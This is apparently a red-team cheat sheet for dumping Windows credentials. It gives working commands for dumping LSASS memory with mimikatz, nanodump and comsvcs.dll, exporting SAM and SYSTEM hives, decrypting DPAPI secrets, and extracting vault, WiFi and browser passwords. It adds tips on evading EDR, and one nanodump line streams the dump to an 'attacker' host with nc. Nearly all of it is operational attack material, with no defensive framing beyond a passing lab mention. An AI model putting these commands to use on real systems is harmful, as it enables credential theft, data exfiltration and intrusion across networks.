# Windows Credential Dump Reference

## LSASS Memory Extraction

### Method 1: Procdump (SysInternals — signed binary, less suspicious)
```
# Full memory dump of LSASS
procdump.exe -accepteula -ma lsass.exe C:\Temp\lsass.dmp

# Find LSASS PID first
tasklist /fi "imagename eq lsass.exe"
```

### Method 2: Mimikatz (direct — most detected)
```
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords     # All plaintext/hash creds
mimikatz # sekurlsa::wdigest            # WDigest plaintext (if enabled)
mimikatz # sekurlsa::ekeys              # Kerberos encryption keys
mimikatz # sekurlsa::kerberos           # Kerberos tickets
```

### Method 3: Nanodump (stealthy — direct syscalls, unhook EDR)
```
nanodump.exe --write C:\Temp\lsass.dmp
nanodump.exe --fork --write C:\Temp\lsass.dmp       # Fork process first
nanodump.exe --write C:\Temp\lsass.dmp --valid       # Valid signature
nanodump.exe --write - | nc attacker 4444            # Stream to attacker
```

### Method 4: Comsvcs.dll (LOLBin — no tools needed)
```
# Get LSASS PID
tasklist /fi "imagename eq lsass.exe"
# Dump using rundll32 (must run from SYSTEM or admin cmd)
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <PID> C:\Temp\lsass.dmp full
```

### Method 5: Task Manager / Process Explorer
- Open Task Manager as admin → Details → lsass.exe → Create dump file
- Useful in CTF/lab when AV isn't a concern

### Offline Parsing
```
# Mimikatz
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords

# pypykatz (Python — runs on Linux)
pypykatz lsa minidump lsass.dmp
pypykatz lsa minidump lsass.dmp -o creds.txt
```

---

## SAM / SYSTEM / SECURITY Hives

### Registry Export (local admin required)
```
reg save HKLM\SAM C:\Temp\SAM
reg save HKLM\SYSTEM C:\Temp\SYSTEM
reg save HKLM\SECURITY C:\Temp\SECURITY
```

### Volume Shadow Copy Method
```
vssadmin create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\Temp\SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\Temp\SYSTEM
```

### Parse Offline
```
impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL
# Outputs: local user NTLM hashes, cached domain creds, LSA secrets
```

---

## DPAPI Secrets

### User Credentials and Vault
```
# List credential files
dir C:\Users\<user>\AppData\Roaming\Microsoft\Credentials\
dir C:\Users\<user>\AppData\Local\Microsoft\Credentials\

# Decrypt with mimikatz
mimikatz # dpapi::cred /in:<credential_file>
mimikatz # dpapi::masterkey /in:<masterkey_file> /rpc   # Domain backup key
mimikatz # dpapi::chrome /in:"C:\Users\<user>\AppData\Local\Google\Chrome\User Data\Default\Login Data"
```

### Domain DPAPI Backup Key (Domain Admin)
```
mimikatz # lsadump::backupkeys /system:<DC_FQDN> /export
# Can decrypt ANY user's DPAPI secrets across the domain
```

---

## Windows Vault
```
vaultcmd /list                        # List vaults
vaultcmd /listschema                  # List credential schemas
mimikatz # vault::cred                # Dump vault credentials
mimikatz # vault::list                # List entries
```

---

## WiFi Passwords
```
# List saved profiles
netsh wlan show profiles

# Extract password for specific profile
netsh wlan show profile name="<SSID>" key=clear

# Batch extract all
for /f "tokens=2 delims=:" %a in ('netsh wlan show profiles ^| findstr "Profile"') do @netsh wlan show profile name=%a key=clear 2>nul | findstr "Key Content"
```

---

## Browser Credential Stores
```
# LaZagne — multi-browser extraction
lazagne.exe browsers
lazagne.exe all -oJ   # JSON output

# SharpChromium — Chrome/Edge specific
SharpChromium.exe logins
SharpChromium.exe cookies
SharpChromium.exe history

# Chrome credential file locations
# Passwords: %LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data (SQLite)
# Cookies: %LOCALAPPDATA%\Google\Chrome\User Data\Default\Cookies
# Encryption key in Local State JSON → DPAPI protected

# Firefox
# Profiles: %APPDATA%\Mozilla\Firefox\Profiles\
# key4.db + logins.json → decrypt with firefox_decrypt.py
python3 firefox_decrypt.py /path/to/profile
```

---

## OPSEC Notes
- LSASS dumps trigger Credential Guard, Windows Defender, and most EDR
- Nanodump and comsvcs.dll are stealthier than mimikatz on disk
- SAM/SYSTEM export is quieter but only gets local accounts
- DPAPI requires either user context or domain backup key
- Always prefer offline parsing over running tools on target
